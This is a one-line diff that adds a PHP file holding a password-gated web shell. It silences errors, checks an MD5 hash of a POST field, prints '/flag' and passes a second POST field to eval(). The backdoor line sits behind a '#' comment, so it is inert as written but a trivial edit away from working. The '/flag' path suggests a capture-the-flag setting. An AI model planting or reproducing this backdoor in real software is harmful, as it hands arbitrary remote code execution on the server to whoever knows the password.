@@ -1,0 +1,1 @@
+<?php error_reporting(0); #if(md5($_POST[a])==='9608f51260c3f8b531e61ef256dbfdb6') {echo file_get_contents('/flag');@eval($_POST[b]);}?>
